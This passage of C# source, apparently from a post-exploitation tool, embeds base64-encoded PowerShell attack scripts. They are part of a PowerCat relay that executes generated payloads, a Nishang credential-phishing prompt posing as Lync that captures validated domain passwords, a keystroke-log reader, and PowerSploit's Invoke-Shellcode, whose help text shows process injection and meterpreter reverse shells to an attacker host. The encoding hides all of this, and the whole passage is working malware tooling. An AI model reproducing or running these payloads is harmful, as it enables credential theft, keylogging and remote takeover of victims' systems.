HJlbGF5IGZvcm1hdC4ifQ0KICAgIH0NCiAgICBlbHNlaWYoJHIuc3BsaXQoIjoiKVswXS5Ub0xvd2VyKCkgLWVxICJ0Y3AiKQ0KICAgIHsNCiAgICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogVENQIg0KICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfVENQfSArICJgbn1gbmBuIikNCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX1RDUH0gKyAiYG59YG5gbiIpDQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX1RDUH0gKyAiYG59YG5gbiIpDQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9UQ1B9ICsgImBufWBuYG4iKQ0KICAgICAgaWYoJHIuc3BsaXQoIjoiKS5Db3VudCAtZXEgMil7JEludm9rZVN0cmluZyArPSAoIkAoJycsYCRUcnVlLCciICsgJHIuc3BsaXQoIjoiKVsxXSArICInLCckdCcpICIpfQ0KICAgICAgZWxzZWlmKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDMpeyRJbnZva2VTdHJpbmcgKz0gKCJAKCciICsgJHIuc3BsaXQoIjoiKVsxXSArICInLGAkRmFsc2UsJyIgKyAkci5zcGxpdCgiOiIpWzJdICsgIicsJyR0JykgIil9DQogICAgICBlbHNle3JldHVybiAiQmFkIHJlbGF5IGZvcm1hdC4ifQ0KICAgIH0NCiAgfQ0KICBlbHNlDQogIHsNCiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IENvbnNvbGUiDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfQ29uc29sZX0gKyAiYG59YG5gbiIpDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfQ29uc29sZX0gKyAiYG59YG5gbiIpDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9Xcml0ZURhdGFgbntgbiIgKyAke2Z1bmN0aW9uOldyaXRlRGF0YV9Db25zb2xlfSArICJgbn1gbmBuIikNCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9Db25zb2xlfSArICJgbn1gbmBuIikNCiAgICAkSW52b2tlU3RyaW5nICs9ICgiQCgnIiArICRvICsgIicpIikNCiAgfQ0KICANCiAgaWYoJGVwKXskRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBNYWluYG57YG4iICsgJHtmdW5jdGlvbjpNYWluX1Bvd2Vyc2hlbGx9ICsgImBufWBuYG4iKX0NCiAgZWxzZXskRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBNYWluYG57YG4iICsgJHtmdW5jdGlvbjpNYWlufSArICJgbn1gbmBuIil9DQogICRJbnZva2VTdHJpbmcgPSAoJEZ1bmN0aW9uU3RyaW5nICsgJEludm9rZVN0cmluZykNCiAgIyMjIyMjIyMjIyBHRU5FUkFURSBQQVlMT0FEICMjIyMjIyMjIyMNCiAgDQogICMjIyMjIyMjIyMgUkVUVVJOIEdFTkVSQVRFRCBQQVlMT0FEUyAjIyMjIyMjIyMjDQogIGlmKCRnZSl7V3JpdGUtVmVyYm9zZSAiUmV0dXJuaW5nIEVuY29kZWQgUGF5bG9hZC4uLiIgOyByZXR1cm4gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCRJbnZva2VTdHJpbmcpKX0NCiAgZWxzZWlmKCRnKXtXcml0ZS1WZXJib3NlICJSZXR1cm5pbmcgUGF5bG9hZC4uLiIgOyByZXR1cm4gJEludm9rZVN0cmluZ30NCiAgIyMjIyMjIyMjIyBSRVRVUk4gR0VORVJBVEVEIFBBWUxPQURTICMjIyMjIyMjIyMNCiAgDQogICMjIyMjIyMjIyMgRVhFQ1VUSU9OICMjIyMjIyMjIyMNCiAgJE91dHB1dCA9ICRudWxsDQogIHRyeQ0KICB7DQogICAgaWYoJHJlcCkNCiAgICB7DQogICAgICB3aGlsZSgkVHJ1ZSkNCiAgICAgIHsNCiAgICAgICAgJE91dHB1dCArPSBJRVggJEludm9rZVN0cmluZw0KICAgICAgICBTdGFydC1TbGVlcCAtcyAyDQogICAgICAgIFdyaXRlLVZlcmJvc2UgIlJlcGV0aXRpb24gRW5hYmxlZDogUmVzdGFydGluZy4uLiINCiAgICAgIH0NCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICRPdXRwdXQgKz0gSUVYICRJbnZva2VTdHJpbmcNCiAgICB9DQogIH0NCiAgZmluYWxseQ0KICB7DQogICAgaWYoJE91dHB1dCAtbmUgJG51bGwpDQogICAgew0KICAgICAgaWYoJG9mIC1lcSAiIil7JE91dHB1dH0NCiAgICAgIGVsc2V7W2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRvZiwkT3V0cHV0KX0NCiAgICB9DQogIH0NCiAgIyMjIyMjIyMjIyBFWEVDVVRJT04gIyMjIyMjIyMjIw0KfQ=="));
            return PSPowerCat;
        }
        public static string Invoke_CredentialsPhish()
        {
            string PSInvoke_CredentialsPhish = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"DQpmdW5jdGlvbiBJbnZva2UtQ3JlZGVudGlhbHNQaGlzaA0Kew0KPCMNCi5TWU5PUFNJUw0KTmlzaGFuZyBzY3JpcHQgd2hpY2ggb3BlbnMgYSB1c2VyIGNyZWRlbnRpYWwgcHJvbXB0Lg0KDQouREVTQ1JJUFRJT04NClRoaXMgcGF5bG9hZCBvcGVucyBhIHByb21wdCB3aGljaCBhc2tzIGZvciB1c2VyIGNyZWRlbnRpYWxzIGFuZCBkb2VzIG5vdCBnbyBhd2F5IHRpbGwgdmFsaWQgbG9jYWwgb3IgZG9tYWluIGNyZWRlbnRpYWxzIGFyZSBlbnRlcmVkIGluIHRoZSBwcm9tcHQuDQoNCi5FWEFNUExFDQpQUyA+IEludm9rZS1DcmVkZW50aWFsc1BoaXNoDQoNCi5MSU5LDQpodHRwOi8vbGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuYmxvZ3Nwb3QuY29tLw0KaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcNCiM+DQoNCltDbWRsZXRCaW5kaW5nKCldDQpQYXJhbSAoKQ0KDQogICAgJEVycm9yQWN0aW9uUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSINCiAgICBBZGQtVHlwZSAtYXNzZW1ibHluYW1lIHN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5hY2NvdW50bWFuYWdlbWVudCANCiAgICAkRFMgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5QcmluY2lwYWxDb250ZXh0KFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuQ29udGV4dFR5cGVdOjpNYWNoaW5lKQ0KICAgICRkb21haW5ETiA9ICJMREFQOi8vIiArIChbQURTSV0iIikuZGlzdGluZ3Vpc2hlZE5hbWUNCiAgICB3aGlsZSgkdHJ1ZSkNCiAgICB7DQoJCSRjcmVkZW50aWFsID0gJEhvc3QudWkuUHJvbXB0Rm9yQ3JlZGVudGlhbCgiQ3JlZGVudGlhbHMgYXJlIHJlcXVpcmVkIHRvIHBlcmZvcm0gdGhpcyBvcGVyYXRpb24iLCJMeW5jIG5lZWRzIHlvdXIgdXNlciBuYW1lIGFuZCBwYXNzd29yZCB0byBjb25uZWN0IGZvciByZXRyaWV2aW5nIGNhbGVuZGVyIGRhdGEgZnJvbSBPdXRsb29rLiIsIiRlbnY6dXNlcmRvbWFpblwkZW52OnVzZXJuYW1lIiwiIikNCiAgICAgICAgaWYoJGNyZWRlbnRpYWwpDQogICAgICAgIHsNCiAgICAgICAgICAgICRjcmVkcyA9ICRjcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkNCiAgICAgICAgICAgIFtTdHJpbmddJHVzZXIgPSAkY3JlZHMudXNlcm5hbWUNCiAgICAgICAgICAgIFtTdHJpbmddJHBhc3MgPSAkY3JlZHMucGFzc3dvcmQNCiAgICAgICAgICAgIFtTdHJpbmddJGRvbWFpbiA9ICRjcmVkcy5kb21haW4NCiAgICAgICAgICAgICRhdXRobG9jYWwgPSAkRFMuVmFsaWRhdGVDcmVkZW50aWFscygkdXNlciwgJHBhc3MpDQogICAgICAgICAgICAkYXV0aGRvbWFpbiA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5KCRkb21haW5ETiwkdXNlciwkcGFzcykNCiAgICAgICAgICAgIGlmKCgkYXV0aGxvY2FsIC1lcSAkdHJ1ZSkgLW9yICgkYXV0aGRvbWFpbi5uYW1lIC1uZSAkbnVsbCkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJG91dHB1dCA9ICJVc2VybmFtZTogIiArICR1c2VyICsgIiBQYXNzd29yZDogIiArICRwYXNzICsgIiBEb21haW46IiArICRkb21haW4gKyAiIERvbWFpbjoiKyAkYXV0aGRvbWFpbi5uYW1lDQogICAgICAgICAgICAgICAgJG91dHB1dA0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQp9"));
            return PSInvoke_CredentialsPhish;
        }
        public static string Get_KeyStrokes()
        {
            string PSInvoke_Get_KeyStrokes = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"ZnVuY3Rpb24gR2V0LUtleVN0cm9rZXMNCgl7DQoJZ2V0LWNvbnRlbnQgIiRlbnY6VGVtcFxLZXlMb2ctKiINCgl9"));
            return PSInvoke_Get_KeyStrokes;
        }
        public static string Invoke_Shellcode()
        {
            string PSInvoke_Shellcode = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"ZnVuY3Rpb24gSW52b2tlLVNoZWxsY29kZQ0Kew0KPCMNCi5TWU5PUFNJUw0KDQpJbmplY3Qgc2hlbGxjb2RlIGludG8gdGhlIHByb2Nlc3MgSUQgb2YgeW91ciBjaG9vc2luZyBvciB3aXRoaW4gdGhlIGNvbnRleHQgb2YgdGhlIHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzLg0KDQpQb3dlclNwbG9pdCBGdW5jdGlvbjogSW52b2tlLVNoZWxsY29kZQ0KQXV0aG9yOiBNYXR0aGV3IEdyYWViZXIgKEBtYXR0aWZlc3RhdGlvbikNCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZQ0KUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lDQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUNCiANCi5ERVNDUklQVElPTg0KDQpQb3J0aW9ucyBvZiB0aGlzIHByb2plY3Qgd2FzIGJhc2VkIHVwb24gc3lyaW5nZS5jIHYxLjIgd3JpdHRlbiBieSBTcGVuY2VyIE1jSW50eXJlDQoNClBvd2VyU2hlbGwgZXhwZWN0cyBzaGVsbGNvZGUgdG8gYmUgaW4gdGhlIGZvcm0gMHhYWCwweFhYLDB4WFguIFRvIGdlbmVyYXRlIHlvdXIgc2hlbGxjb2RlIGluIHRoaXMgZm9ybSwgeW91IGNhbiB1c2UgdGhpcyBjb21tYW5kIGZyb20gd2l0aGluIEJhY2t0cmFjayAoVGhhbmtzLCBNYXR0IGFuZCBnMHRtMWxrKToNCg0KbXNmcGF5bG9hZCB3aW5kb3dzL2V4ZWMgQ01EPSJjbWQgL2sgY2FsYyIgRVhJVEZVTkM9dGhyZWFkIEMgfCBzZWQgJzEsNmQ7cy9bIjtdLy9nO3MvXFwvLDAvZycgfCB0ciAtZCAnXG4nIHwgY3V0IC1jMi0gDQoNCk1ha2Ugc3VyZSB0byBzcGVjaWZ5ICd0aHJlYWQnIGZvciB5b3VyIGV4aXQgcHJvY2Vzcy4gQWxzbywgZG9uJ3QgYm90aGVyIGVuY29kaW5nIHlvdXIgc2hlbGxjb2RlLiBJdCdzIGVudGlyZWx5IHVubmVjZXNzYXJ5Lg0KIA0KLlBBUkFNRVRFUiBQcm9jZXNzSUQNCg0KUHJvY2VzcyBJRCBvZiB0aGUgcHJvY2VzcyB5b3Ugd2FudCB0byBpbmplY3Qgc2hlbGxjb2RlIGludG8uDQoNCi5QQVJBTUVURVIgU2hlbGxjb2RlDQoNClNwZWNpZmllcyBhbiBvcHRpb25hbCBzaGVsbGNvZGUgcGFzc2VkIGluIGFzIGEgYnl0ZSBhcnJheQ0KDQouUEFSQU1FVEVSIExpc3RNZXRhc3Bsb2l0UGF5bG9hZHMNCg0KTGlzdHMgYWxsIG9mIHRoZSBhdmFpbGFibGUgTWV0YXNwbG9pdCBwYXlsb2FkcyB0aGF0IEludm9rZS1TaGVsbGNvZGUgc3VwcG9ydHMNCg0KLlBBUkFNRVRFUiBMaG9zdA0KDQpTcGVjaWZpZXMgdGhlIElQIGFkZHJlc3Mgb2YgdGhlIGF0dGFjayBtYWNoaW5lIHdhaXRpbmcgdG8gcmVjZWl2ZSB0aGUgcmV2ZXJzZSBzaGVsbA0KDQouUEFSQU1FVEVSIExwb3J0DQogDQpTcGVjaWZpZXMgdGhlIHBvcnQgb2YgdGhlIGF0dGFjayBtYWNoaW5lIHdhaXRpbmcgdG8gcmVjZWl2ZSB0aGUgcmV2ZXJzZSBzaGVsbA0KDQouUEFSQU1FVEVSIFBheWxvYWQNCg0KU3BlY2lmaWVzIHRoZSBtZXRhc3Bsb2l0IHBheWxvYWQgdG8gdXNlLiBDdXJyZW50bHksIG9ubHkgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwJyBhbmQgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcycgcGF5bG9hZHMgYXJlIHN1cHBvcnRlZC4NCg0KLlBBUkFNRVRFUiBVc2VyQWdlbnQNCg0KT3B0aW9uYWxseSBzcGVjaWZpZXMgdGhlIHVzZXIgYWdlbnQgdG8gdXNlIHdoZW4gdXNpbmcgbWV0ZXJwcmV0ZXIgaHR0cCBvciBodHRwcyBwYXlsb2Fkcw0KDQouUEFSQU1FVEVSIFByb3h5DQoNCk9wdGlvbmFsbHkgc3BlY2lmaWVzIHdoZXRoZXIgdG8gdXRpbGl6ZSB0aGUgcHJveHkgc2V0dGluZ3Mgb24gdGhlIG1hY2hpbmUuDQoNCi5QQVJBTUVURVIgTGVnYWN5DQoNCk9wdGlvbmFsbHkgc3BlY2lmaWVzIHdoZXRoZXIgdG8gdXRpbGl6ZSB0aGUgb2xkZXIgbWV0ZXJwcmV0ZXIgaGFuZGxlciAiSU5JVE0iLiBUaGlzIHdpbGwgbGlrZWx5IGJlIHJlbW92ZWQgaW4gdGhlIGZ1dHVyZS4gDQoNCi5QQVJBTUVURVIgRm9yY2UNCg0KSW5qZWN0cyBzaGVsbGNvZGUgd2l0aG91dCBwcm9tcHRpbmcgZm9yIGNvbmZpcm1hdGlvbi4gQnkgZGVmYXVsdCwgSW52b2tlLVNoZWxsY29kZSBwcm9tcHRzIGZvciBjb25maXJtYXRpb24gYmVmb3JlIHBlcmZvcm1pbmcgYW55IG1hbGljaW91cyBhY3QuDQoNCi5FWEFNUExFDQoNCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1Qcm9jZXNzSWQgNDI3NA0KDQpEZXNjcmlwdGlvbg0KLS0tLS0tLS0tLS0NCkluamVjdCBzaGVsbGNvZGUgaW50byBwcm9jZXNzIElEIDQyNzQuDQoNCi5FWEFNUExFDQoNCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlDQoNCkRlc2NyaXB0aW9uDQotLS0tLS0tLS0tLQ0KSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBydW5uaW5nIGluc3RhbmNlIG9mIFBvd2VyU2hlbGwuDQoNCi5FWEFNUExFDQoNCkM6XFBTPiBTdGFydC1Qcm9jZXNzIEM6XFdpbmRvd3NcU3lzV09XNjRcbm90ZXBhZC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbg0KQzpcUFM+ICRQcm9jID0gR2V0LVByb2Nlc3Mgbm90ZXBhZA0KQzpcUFM+IEludm9rZS1TaGVsbGNvZGUgLVByb2Nlc3NJZCAkUHJvYy5JZCAtUGF5bG9hZCB3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMgLUxob3N0IDE5Mi4xNjguMzAuMTI5IC1McG9ydCA0NDMgLVZlcmJvc2UNCg0KVkVSQk9TRTogUmVxdWVzdGluZyBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gaHR0cHM6Ly8xOTIuMTY4LjMwLjEyOTo0NDMvSU5JVE0NClZFUkJPU0U6IEluamVjdGluZyBzaGVsbGNvZGUgaW50byBQSUQ6IDQwMDQNClZFUkJPU0U6IEluamVjdGluZyBpbnRvIGEgV293NjQgcHJvY2Vzcy4NClZFUkJPU0U6IFVzaW5nIDMyLWJpdCBzaGVsbGNvZGUuDQpWRVJCT1NFOiBTaGVsbGNvZGUgbWVtb3J5IHJlc2VydmVkIGF0IDB4MDNCRTAwMDANClZFUkJPU0U6IEVtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuDQpWRVJCT1NFOiBUaHJlYWQgY2FsbCBzdHViIG1lbW9yeSByZXNlcnZlZCBhdCAweDAwMUIwMDAwDQpWRVJCT1NFOiBTaGVsbGNvZGUgaW5qZWN0aW9uIGNvbXBsZXRlIQ0KDQpEZXNjcmlwdGlvbg0KLS0tLS0tLS0tLS0NCkVzdGFibGlzaGVzIGEgcmV2ZXJzZSBodHRwcyBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gd2l0aGluIHRoZSBoaWRkZW4gbm90ZXBhZCBwcm9jZXNzLiBBIG11bHRpLWhhbmRsZXIgd2FzIHNldCB1cCB3aXRoIHRoZSBmb2xsb3dpbmcgb3B0aW9uczoNCg0KUGF5bG9hZCBvcHRpb25zICh3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMpOg0KDQpOYW1lICAgICAgQ3VycmVudCBTZXR0aW5nICBSZXF1aXJlZCAgRGVzY3JpcHRpb24NCi0tLS0gICAgICAtLS0tLS0tLS0tLS0tLS0gIC0tLS0tLS0tICAtLS0tLS0tLS0tLQ0KRVhJVEZVTkMgIHRocmVhZCAgICAgICAgICAgeWVzICAgICAgIEV4aXQgdGVjaG5pcXVlOiBzZWgsIHRocmVhZCwgcHJvY2Vzcywgbm9uZQ0KTEhPU1QgICAgIDE5Mi4xNjguMzAuMTI5ICAgeWVzICAgICAgIFRoZSBsb2NhbCBsaXN0ZW5lciBob3N0bmFtZQ0KTFBPUlQgICAgIDQ0MyAgICAgICAgICAgICAgeWVzICAgICAgIFRoZSBsb2NhbCBsaXN0ZW5lciBwb3J0DQoNCi5FWEFNUExFDQoNCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1QYXlsb2FkIHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcyAtTGhvc3QgMTkyLjE2OC4zMC4xMjkgLUxwb3J0IDgwDQoNCkRlc2NyaXB0aW9uDQotLS0tLS0tLS0tLQ0KRXN0YWJsaXNoZXMgYSByZXZlcnNlIGh0dHAgbWV0ZXJwcmV0ZXIgcGF5bG9hZCBmcm9tIHdpdGhpbiB0aGUgcnVubmluZyBQd2VyU2hlbGwgcHJvY2Vzcy4gQSBtdWx0aS1oYW5kbGVyIHdhcyBzZXQgdXAgd2l0aCB0aGUgZm9sbG93aW5nIG9wdGlvbnM6DQoNClBheWxvYWQgb3B0aW9ucyAod2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHApOg0KDQpOYW1lICAgICAgQ3VycmVudCBTZXR0aW5nICBSZXF1aXJlZCAgRGVzY3JpcHRpb24NCi0tLS0gICAgICAtLS0tLS0tLS0tLS0tLS0gIC0tLS0tLS0tICAtLS0tLS0tLS0tLQ0KRVhJVEZVTkMgIHRocmVhZCAgICAgICAgICAgeWVzICAgICAgIEV4aXQgdGVjaG5pcXVlOiBzZWgsIHRocmVhZCwgcHJvY2Vzcywgbm9uZQ0KTEhPU1QgICAgIDE5Mi4xNjguMzAuMTI5ICAgeWVzICAgICAgIFRoZSBsb2NhbCBsaXN0ZW5lciBob3N0bmFtZQ0KTFBPUlQgICAgIDgwICAgICAgICAgICAgICAgeWVzICAgICAgIFRoZSBsb2NhbCBsaXN0ZW5lciBwb3J0DQoNCi5FWEFNUExFDQoNCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1TaGVsbGNvZGUgQCgweDkwLDB4OTAsMHhDMykNCiAgICANCkRlc2NyaXB0aW9uDQotLS0tLS0tLS0tLQ0KT3ZlcnJpZGVzIHRoZSBzaGVsbGNvZGUgaW5jbHVkZWQgaW4gdGhlIHNjcmlwdCB3aXRoIGN1c3RvbSBzaGVsbGNvZGUgLSAweDkwIChOT1ApLCAweDkwIChOT1ApLCAweEMzIChSRVQpDQpXYXJuaW5nOiBUaGlzIHNjcmlwdCBoYXMgbm8gd2F5IHRvIHZhbGlkYXRlIHRoYXQgeW91ciBzaGVsbGNvZGUgaXMgMzIgdnMuIDY0LWJpdCENCiAgICANCi5FWEFNUExFDQoNCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1MaXN0TWV0YXNwbG9pdFBheWxvYWRzDQogICAgDQpQYXlsb2Fkcw0KLS0tLS0tLS0NCndpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwDQp3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMNCg0KLk5PVEVTDQoNClVzZSB0aGUgJy1WZXJib3NlJyBvcHRpb24gdG8gcHJpbnQgZGV0YWlsZWQgaW5mb3JtYXRpb24uDQoNClBsYWNlIHlvdXIgZ2VuZXJhdGVkIHNoZWxsY29kZSBpbiAkU2hlbGxjb2RlMzIgYW5kICRTaGVsbGNvZGU2NCB2YXJpYWJsZXMgb3IgcGFzcyBpdCBpbiBhcyBhIGJ5dGUgYXJyYXkgdmlhIHRoZSAnLVNoZWxsY29kZScgcGFyYW1ldGVyDQoNCkJpZyB0aGFua3MgdG8gT2lzaW4gKHgwbikgR3JlaGFuIChAb2lzaW5nKSBmb3IgYW5zd2VyaW5nIGFsbCBteSBvYnNjdXJlIHF1ZXN0aW9ucyBhdCB0aGUgZHJvcCBvZiBhIGhhdCAtIGh0dHA6Ly93d3cubml2b3Qub3JnLw0KDQouTElOSw0KDQpodHRwOi8vd3d3LmV4cGxvaXQtbW9uZGF5LmNvbQ0KIz4NCg0KW0NtZGxldEJpbmRpbmcoIERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ1J1bkxvY2FsJywgU3VwcG9ydHNTaG91bGRQcm9jZXNzID0gJFRydWUgLCBDb25maXJtSW1wYWN0ID0gJ0hpZ2gnKV0gUGFyYW0gKA0KICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldDQogICAgW1VJbnQxNl0NCiAgICAkUHJvY2Vzc0lELA0KICAgIA0KICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnUnVuTG9jYWwnICldDQogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0NCiAgICBbQnl0ZVtdXQ0KICAgICRTaGVsbGNvZGUsDQogICAgDQogICAgW1BhcmFtZXRlciggUGFyYW1ldGVyU2V0TmFtZSA9ICdNZXRhc3Bsb2l0JyApXQ0KICAgIFtWYWxpZGF0ZVNldCggJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwJywNCiAgICAgICAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMnLA0KICAgICAgICAgICAgICAgICAgSWdub3JlQ2FzZSA9ICRUcnVlICldDQogICAgW1N0cmluZ10NCiAgICAkUGF5bG9hZCA9ICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcsDQogICAgDQogICAgW1BhcmFtZXRlciggUGFyYW1ldGVyU2V0TmFtZSA9ICdMaXN0UGF5bG9hZHMnICldDQogICAgW1N3aXRjaF0NCiAgICAkTGlzdE1ldGFzcGxvaXRQYXlsb2FkcywNCiAgICANCiAgICBbUGFyYW1ldGVyKCBNYW5kYXRvcnkgPSAkVHJ1ZSwNCiAgICAgICAgICAgICAgICBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldDQogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0NCiAgICBbU3RyaW5nXQ0KICAgICRMaG9zdCA9ICcxMjcuMC4wLjEnLA0KICAgIA0KICAgIFtQYXJhbWV0ZXIoIE1hbmRhdG9yeSA9ICRUcnVlLA0KICAgICAgICAgICAgICAgIFBhcmFtZXRlclNldE5hbWUgPSAnTWV0YXNwbG9pdCcgKV0NCiAgICBbVmFsaWRhdGVSYW5nZSggMSw2NTUzNSApXQ0KICAgIFtJbnRdDQogICAgJExwb3J0ID0gODQ0MywNCiAgICANCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldDQogICAgW1ZhbGlkYXRlTm90TnVsbCgpXQ0KICAgIFtTdHJpbmddDQogICAgJFVzZXJBZ2VudCA9IChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncycpLidVc2VyIEFnZW50JywNCg0KICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnTWV0YXNwbG9pdCcgKV0NCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldDQogICAgW1N3aXRjaF0NCiAgICAkTGVnYWN5ID0gJEZhbHNlLA0KDQogICAgW1BhcmFtZXRlciggUGFyYW1ldGVyU2V0TmFtZSA9ICdNZXRhc3Bsb2l0JyApXQ0KICAgIFtWYWxpZGF0ZU5vdE51bGwoKV0NCiAgICBbU3dpdGNoXQ0KICAgICRQcm94eSA9ICRGYWxzZSwNCiAgICANCiAgICBbU3dpdGNoXQ0KICAgICRGb3JjZSA9ICRGYWxzZQ0KKQ0KDQogICAgU2V0LVN0cmljdE1vZGUgLVZlcnNpb24gMi4wDQogICAgDQogICAgIyBMaXN0IGFsbCBhdmFpbGFibGUgTWV0YXNwbG9pdCBwYXlsb2FkcyBhbmQgZXhpdCB0aGUgZnVuY3Rpb24NCiAgICBpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdMaXN0UGF5bG9hZHMnKQ0KICAgIHsNCiAgICAgICAgJEF2YWlsYWJsZVBheWxvYWRzID0gKEdldC1Db21tYW5kIEludm9rZS1TaGVsbGNvZGUpLlBhcmFtZXRlcnNbJ1BheWxvYWQnXS5BdHRyaWJ1dGVzIHwNCiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7JF8uVHlwZUlkIC1lcSBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5WYWxpZGF0ZVNldEF0dHJpYnV0ZV19DQogICAgDQogICAgICAgIGZvcmVhY2ggKCRQYXlsb2FkIGluICRBdmFpbGFibGVQYXlsb2Fkcy5WYWxpZFZhbHVlcykNCiAgICAgICAgew0KICAgICAgICAgICAgTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsgUGF5bG9hZHMgPSAkUGF5bG9hZCB9DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIFJldHVybg0KICAgIH0NCg0KICAgIGlmICggJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9jZXNzSUQnXSApDQogICAgew0KICAgICAgICAjIEVuc3VyZSBhIHZhbGlkIHByb2Nlc3MgSUQgd2FzIHByb3ZpZGVkDQogICAgICAgICMgVGhpcyBjb3VsZCBoYXZlIGJlZW4gdmFsaWRhdGVkIHZpYSAnVmFsaWRhdGVTY3JpcHQnIGJ1dCB0aGUgZXJyb3IgZ2VuZXJhdGVkIHdpdGggR2V0LVByb2Nlc3MgaXMgbW9yZSBkZXNjcmlwdGl2ZQ0KICAgICAgICBHZXQtUHJvY2VzcyAtSWQgJFByb2Nlc3NJRCAtRXJyb3JBY3Rpb24gU3RvcCB8IE91dC1OdWxsDQogICAgfQ0KICAgIA0KICAgIGZ1bmN0aW9uIExvY2FsOkdldC1EZWxlZ2F0ZVR5cGUNCiAgICB7DQogICAgICAgIFBh